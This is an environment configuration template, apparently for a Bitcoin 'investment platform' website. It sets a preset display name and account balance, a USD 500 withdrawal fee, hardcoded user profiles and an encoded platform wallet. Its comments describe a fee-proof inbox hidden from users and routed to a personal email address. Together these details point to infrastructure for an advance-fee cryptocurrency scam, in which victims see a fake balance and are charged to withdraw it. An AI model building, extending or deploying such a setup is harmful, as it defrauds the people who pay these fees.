PLATFORM_NAME=Investment Scheme
DISPLAY_NAME=Jerry McMillan
SITE_TAGLINE=Bitcoin Investment Platform
SUPPORT_EMAIL=support@plaidinvest.com
ACCOUNT_BALANCE=15500
WITHDRAWAL_FEE_USD=500
INITIAL_DEPOSIT_DATE=24/06/2026

LOGIN_EMAIL=you@email.com
LOGIN_PASSWORD=your-password

# ── Vercel (live site: https://www.plaidinvest.online) ─────────────────────
# Add the same keys in Project → Settings → Environment Variables, then redeploy.
# The build runs scripts/generate-env.py → js/env.js (not committed to git).
#
# Required for Jerry login on live:
#   LOGIN_EMAIL, LOGIN_PASSWORD
#
# Lawson and Sarah profiles are hardcoded in js/config.js (not env).
#
# Required for matching local dashboard state:
#   DISPLAY_NAME, ACCOUNT_BALANCE, WITHDRAWAL_FEE_USD
#
# Platform BTC wallet is encoded in js/config.js (see scripts/encode-wallet.py).
#
# Cross-device account sync (encoded seed DB in api/account-seeds.js; optional Upstash in api/sync-credentials.js):
#   UPSTASH_REDIS_REST_URL=https://....upstash.io
#   UPSTASH_REDIS_REST_TOKEN=your-token
#
# Or encode Upstash credentials in api/sync-credentials.js (see scripts/encode-wallet.py).
# Without Upstash, the live API uses an in-memory fallback on Vercel (best-effort).
# Local Live Server syncs to the live site via SITE.syncApiBase in js/config.js.
#
# Optional — fee-proof notification inbox (server-side only; users never see FormSubmit):
#   FEE_PROOF_EMAIL=ronniechristopher89@gmail.com
#
# Local preview:
#   python3 scripts/generate-env.py && python3 -m http.server 8080
